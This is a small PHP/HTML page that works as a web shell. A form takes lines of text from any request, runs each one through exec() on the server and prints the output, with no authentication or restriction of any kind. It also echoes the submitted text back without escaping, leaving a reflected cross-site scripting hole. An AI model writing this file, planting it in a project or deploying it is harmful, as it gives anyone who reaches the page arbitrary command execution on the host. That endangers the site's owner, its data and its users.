<form method=post action="exec.php">
	<table style="height:100%;width:100%">
		<tr><td height="10%">
			<textarea name=MyAction style="height:100%;width:100%"><?=(isset($_REQUEST['MyAction']) ? $_REQUEST['MyAction'] : '')?></textarea>
		</td></tr><tr><td height="90%">
			<textarea name=Output style="height:100%;width:100%"><?
if(isset($_REQUEST['MyAction']))
{
	$MyAction=preg_split("/\\r?\\n/", $_REQUEST['MyAction']);
	foreach($MyAction as $Action)
	{
		exec($Action, $MyOutput);
		print htmlentities(implode("\n", $MyOutput), ENT_QUOTES, 'ISO8859-1')."\n-----------------------\n";
	}
}
			?></textarea>
		</td></tr><tr><td height=1>
			<input type=submit>
		</td></tr>
	</table>
</form>